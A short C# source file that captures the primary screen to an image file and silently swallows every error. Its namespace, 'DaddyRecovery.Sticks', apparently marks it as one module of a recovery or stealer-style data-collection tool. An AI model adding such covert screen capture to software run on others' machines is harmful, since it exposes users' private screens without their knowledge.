namespace DaddyRecovery.Sticks
{
    using System;
    using System.Drawing;
    using System.Windows.Forms;

    public static class ScreenShot
    {
        public static void Inizialize(string path)
        {
            int width = Screen.PrimaryScreen.Bounds.Width,
                height = Screen.PrimaryScreen.Bounds.Height;
            try
            {
                using (var bmp = new Bitmap(width, height))
                using (var graph = Graphics.FromImage(bmp))
                {
                    try
                    {
                        graph.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                        bmp.Save(path);
                    }
                    catch (Exception) { }
                }
            }
            catch (Exception) { }
        }
    }
}